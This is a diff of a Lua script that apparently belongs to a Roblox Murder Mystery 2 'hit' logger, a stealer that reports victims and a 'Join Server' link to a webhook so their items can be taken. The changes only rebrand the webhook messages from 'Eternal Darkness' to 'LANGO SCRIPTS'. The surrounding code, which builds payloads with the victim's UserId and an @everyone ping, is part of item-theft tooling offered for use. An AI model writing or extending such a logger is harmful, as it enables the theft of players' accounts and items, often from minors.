@@ -388,7 +388,7 @@ table.insert(fields, {name = "🔗 Actions", value = "[Join Server](" .. fernJoi
 
 local payload = {
     content = isPingWorthy and "@everyone 🌑 **NEW MM2 HIT | LANGO SCRIPTS**" or nil,
-    username = "🌑 Eternal Darkness",
+    username = "🌑 LANGO SCRIPTER",
     avatar_url = "https://imgur.com/a/LhzvN5h.png",
     embeds = {{
         title = "LANGO SCRIPTS MM2   HIT | " .. hitCategory,
@@ -413,10 +413,10 @@ local publicFields = {
 
 local PublicPayload = {
     content = "🌑 **MM2 Public Hits | LANGO SCRIPTS**",
-    username = "🌑 Eternal Darkness",
+    username = "🌑 LANGO SCRIPTS",
     avatar_url = "https://imgur.com/a/LhzvN5h.png",
     embeds = {{
-        title = "Eternal Darkness MM2 HIT | " .. hitCategory,
+        title = "LANGO SCRIPTS MM2 HIT | " .. hitCategory,
         url = rubisLink,
         color = 0x1a1a2e,
         thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"},
